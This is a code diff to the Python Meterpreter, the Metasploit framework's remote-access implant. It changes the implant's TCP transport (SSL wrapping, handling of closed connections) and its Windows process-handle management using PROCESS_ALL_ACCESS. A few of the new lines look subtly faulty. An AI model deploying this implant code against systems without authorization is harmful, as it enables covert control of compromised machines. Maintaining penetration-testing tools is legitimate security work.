@@ -361,18 +361,19 @@ if DEBUGGING:
         file_handler.setLevel(logging.DEBUG)
         logging.getLogger().addHandler(file_handler)
 
-class SYSTEM_INFO(ctypes.Structure):
-    _fields_ = [("wProcessorArchitecture", ctypes.c_uint16),
-        ("wReserved", ctypes.c_uint16),
-        ("dwPageSize", ctypes.c_uint32),
-        ("lpMinimumApplicationAddress", ctypes.c_void_p),
-        ("lpMaximumApplicationAddress", ctypes.c_void_p),
-        ("dwActiveProcessorMask", ctypes.c_uint32),
-        ("dwNumberOfProcessors", ctypes.c_uint32),
-        ("dwProcessorType", ctypes.c_uint32),
-        ("dwAllocationGranularity", ctypes.c_uint32),
-        ("wProcessorLevel", ctypes.c_uint16),
-        ("wProcessorRevision", ctypes.c_uint16)]
+if has_windll:
+    class SYSTEM_INFO(ctypes.Structure):
+        _fields_ = [("wProcessorArchitecture", ctypes.c_uint16),
+            ("wReserved", ctypes.c_uint16),
+            ("dwPageSize", ctypes.c_uint32),
+            ("lpMinimumApplicationAddress", ctypes.c_void_p),
+            ("lpMaximumApplicationAddress", ctypes.c_void_p),
+            ("dwActiveProcessorMask", ctypes.c_uint32),
+            ("dwNumberOfProcessors", ctypes.c_uint32),
+            ("dwProcessorType", ctypes.c_uint32),
+            ("dwAllocationGranularity", ctypes.c_uint32),
+            ("wProcessorLevel", ctypes.c_uint16),
+            ("wProcessorRevision", ctypes.c_uint16)]
 
 def rand_bytes(n):
     return os.urandom(n)
@@ -1154,7 +1155,8 @@ class TcpTransport(Transport):
             sock.settimeout(timeout)
             sock.connect((address, port))
             sock.settimeout(None)
-        self.socket = sock
+        import ssl
+        self.socket = ssl.wrap_socket(sock) if isinstance(self.socket, ssl.SSLSocket) else sock
         self._first_packet = True
         return True
 
@@ -1169,7 +1171,7 @@ class TcpTransport(Transport):
         if not select.select([self.socket], [], [], 0.5)[0]:
             return bytes()
         packet = self.socket.recv(PACKET_HEADER_SIZE)
-        if packet == '':  # remote is closed
+        if len(packet) == 0:  # remote is closed
             self.request_retire = True
             return None
         if len(packet) != PACKET_HEADER_SIZE:
@@ -1179,7 +1181,11 @@ class TcpTransport(Transport):
                 pkt_length = struct.unpack('>I', header)[0]
                 self.socket.settimeout(max(self.communication_timeout, 30))
                 while received < pkt_length:
-                    received += len(self.socket.recv(pkt_length - received))
+                    new_received = len(self.socket.recv(pkt_length - received))
+                    if new_received == 0:
+                        self.request_retire = True
+                        return None
+                    received += new_received
                 self.socket.settimeout(None)
                 return self._get_packet()
             return None
@@ -1194,6 +1200,9 @@ class TcpTransport(Transport):
         rest = bytes()
         while len(rest) < pkt_length:
             rest += self.socket.recv(pkt_length - len(rest))
+            if len(rest) == 0:
+                self.request_retire = True
+                return None
         # return the whole packet, as it's decoded separately
         return packet + rest
 
@@ -1258,13 +1267,6 @@ class PythonMeterpreter(object):
         self.next_channel_id += 1
         return idx
 
-    def add_process(self, process):
-        idx = self.next_process_id
-        self.processes[idx] = process
-        debug_print('[*] added process id: ' + str(idx))
-        self.next_process_id += 1
-        return idx
-
     def close_channel(self, channel_id):
         if channel_id not in self.channels:
             return False
@@ -1278,6 +1280,41 @@ class PythonMeterpreter(object):
         if channel_id in self.interact_channels:
             self.interact_channels.remove(channel_id)
         debug_print('[*] closed and removed channel id: ' + str(channel_id))
+        return True
+
+    def add_process(self, process):
+        if has_windll:
+            PROCESS_ALL_ACCESS = 0x1fffff
+            OpenProcess = ctypes.windll.kernel32.OpenProcess
+            OpenProcess.argtypes = [ctypes.c_ulong, ctypes.c_long, ctypes.c_ulong]
+            OpenProcess.restype = ctypes.c_void_p
+            handle = OpenProcess(PROCESS_ALL_ACCESS, False, process.pid)
+        else:
+            handle = self.next_process_id
+            self.next_process_id += 1
+        self.processes[handle] = process
+        debug_print('[*] added process id: ' + str(process.pid) + ', handle: ' + str(handle))
+        return handle
+
+    def close_process(self, proc_h_id):
+        if proc_h_id not in self.processes:
+            return False
+        proc_h = self.processes.pop(proc_h_id)
+        if proc_h:
+            # proc_h is only set when we started the process via execute and not when we attached to it
+            for channel_id, channel in self.channels.items():
+                if not isinstance(channel, MeterpreterProcess):
+                    continue
+                if not channel.proc_h is proc_h:
+                    continue
+                self.close_channel(channel_id)
+                break
+        if has_windll:
+            CloseHandle = ctypes.windll.kernel32.CloseHandle
+            CloseHandle.argtypes = [ctypes.c_void_p]
+            CloseHandle.restype = ctypes.c_long
+            CloseHandle(proc_h_id)
+        debug_print('[*] closed and removed process handle: ' + str(proc_h_id))
         return True
 
     def get_packet(self):
